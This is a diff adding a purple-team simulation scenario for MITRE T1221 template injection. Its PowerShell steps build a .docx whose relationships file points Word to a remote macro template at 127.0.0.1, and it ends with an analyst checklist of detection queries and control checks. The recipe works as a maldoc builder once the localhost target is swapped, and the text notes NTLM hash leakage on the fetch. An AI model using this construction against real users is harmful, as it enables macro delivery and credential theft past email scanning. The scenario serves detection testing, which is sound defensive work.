@@ -1,0 +1,143 @@
+id: T1221_template_injection
+name: "Template Injection"
+mitre_technique: "T1221"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries create Office documents that reference a remote template URL. When the
+  document is opened, Word/Excel fetches the template from the attacker-controlled URL —
+  the template contains the malicious macro or exploit payload. The initial document
+  appears clean (no macros) and passes email gateway static analysis; the payload
+  arrives only at open time via the template fetch. This technique also enables
+  credential harvesting via NTLM authentication challenges on the template fetch.
+  This scenario creates a .docx with a remote template reference and validates
+  detection of the template URL in document metadata and network telemetry.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1221/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1221 — Template Injection simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a .docx with an injected remote template reference"
+    command: |
+      $docxPath = "$env:TEMP\PAS_T1221_invoice.docx"
+
+      # A minimal valid .docx is a ZIP with specific XML files
+      # We'll create the word/settings.xml with a remote template reference
+      Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+      $tempDir = "$env:TEMP\PAS_T1221_docx_src"
+      New-Item -ItemType Directory "$tempDir\word\_rels" -Force | Out-Null
+      New-Item -ItemType Directory "$tempDir\_rels" -Force | Out-Null
+
+      # [Content_Types].xml
+      Set-Content "$tempDir\[Content_Types].xml" @'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+  <Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
+</Types>
+'@
+      # _rels/.rels
+      Set-Content "$tempDir\_rels\.rels" @'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
+</Relationships>
+'@
+      # word/document.xml — minimal body
+      Set-Content "$tempDir\word\document.xml" @'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
+            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:body><w:p><w:r><w:t>PAS T1221 Template Injection Test Document</w:t></w:r></w:p></w:body>
+</w:document>
+'@
+      # word/_rels/document.xml.rels — injects remote template URL
+      Set-Content "$tempDir\word\_rels\document.xml.rels" @'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+    Target="http://127.0.0.1/PAS_T1221_template.dotm"
+    TargetMode="External"/>
+</Relationships>
+'@
+      # word/settings.xml — references the external template
+      Set-Content "$tempDir\word\settings.xml" @'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
+            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <w:attachedTemplate r:id="rId1"/>
+</w:settings>
+'@
+      # Pack into a .docx ZIP
+      if (Test-Path $docxPath) { Remove-Item $docxPath -Force }
+      [IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $docxPath)
+      Write-Host "[PAS] Template-injected .docx created: $docxPath"
+      Write-Host "[PAS] Contains remote template URL: http://127.0.0.1/PAS_T1221_template.dotm"
+      Write-Host "[PAS] When opened in Word: Word fetches the .dotm from 127.0.0.1"
+      Write-Host "[PAS] Email gateway static scan: document appears clean (no macros in .docx itself)"
+
+  - step: 3
+    type: exec_powershell
+    description: "Validate the template URL is present in the document relationship XML"
+    command: |
+      $docxPath = "$env:TEMP\PAS_T1221_invoice.docx"
+      Add-Type -AssemblyName System.IO.Compression.FileSystem
+      $zip      = [IO.Compression.ZipFile]::OpenRead($docxPath)
+      $relsEntry = $zip.Entries | Where-Object { $_.FullName -like "word/_rels/*.rels" } |
+                   Select-Object -First 1
+      $reader   = New-Object IO.StreamReader($relsEntry.Open())
+      $content  = $reader.ReadToEnd()
+      $reader.Close()
+      $zip.Dispose()
+      Write-Host "[PAS] word/_rels/document.xml.rels content:"
+      $content | Select-String "attachedTemplate|Target=" | ForEach-Object {
+          Write-Host "  $($_.Line.Trim())"
+      }
+      Write-Host "[PAS] Remote template URL confirmed in document relationship"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check: submit .docx to Defender for Office 365 Safe Attachments; check for attachedTemplate with external URL"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove .docx and source directory"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1221_invoice.docx" -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1221_docx_src"     -Recurse -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Template injection test files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1221 cleanup complete"
+
+analyst_checklist:
+  - "File event: .docx file created containing attachedTemplate with TargetMode=External"
+  - "Network event: winword.exe making HTTP request to fetch .dotm template on document open"
+  - "MDE: DeviceNetworkEvents | where InitiatingProcessFileName == 'winword.exe' and RemoteUrl !contains 'microsoft.com'"
+  - "Sentinel: DeviceNetworkEvents | where InitiatingProcessFileName in ('winword.exe','excel.exe') and ActionType == 'ConnectionSuccess'"
+  - "MDE alert: 'Office document fetching remote template' or 'Template injection detected'"
+  - "CONTROL CHECK: Defender for Office 365 Safe Attachments must detonate .docx files — not just scan them statically"
+  - "CONTROL CHECK: Block outbound HTTP/HTTPS from Office applications via network policy (not just firewall rules — also ASR)"
+  - "CONTROL CHECK: NTLM authentication on template fetch leaks credential hash — ensure SMB signing and NTLMv1 is disabled"
+  - "CONTROL CHECK: Use yara rules to scan .docx ZIP contents for attachedTemplate + TargetMode=External before delivery"
